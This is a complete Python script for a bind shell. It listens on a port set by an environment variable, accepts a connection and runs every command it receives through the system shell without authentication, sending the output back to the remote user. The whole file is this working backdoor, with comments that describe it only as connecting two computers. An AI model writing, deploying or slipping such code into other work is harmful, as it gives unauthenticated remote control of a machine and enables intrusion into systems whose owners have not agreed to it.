import socket
import sys
import os
import subprocess
from dotenv import load_dotenv

load_dotenv()

# Create a socket ( connect two computers )
def create_socket():
    try:
        global host
        global port 
        global s 
        host = "" 
        port = int(os.getenv("PORT"))
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    
    
# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port 
        global s 
        
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)
         
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established")
    print("IP: " + address[0] + "  |  Port: " + str(address[1]))
    while True:
        currentWD = os.getcwd() + "> "
        conn.send(str.encode(currentWD))
        client_res = conn.recv(1024)
        if client_res.decode("utf-8") == "quit":
            conn.close()
            s.close()
            sys.exit()
            break
        execute_command(client_res, conn)
    
    conn.close()
    
def execute_command(cmd, conn):
    if cmd[:2].decode("utf-8") == "cd":
        os.chdir(cmd[3:])
        
    if len(cmd) > 0:
        cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, 
                            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        conn.send(str.encode(output_str))

    print(output_str)
            

            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
    
main()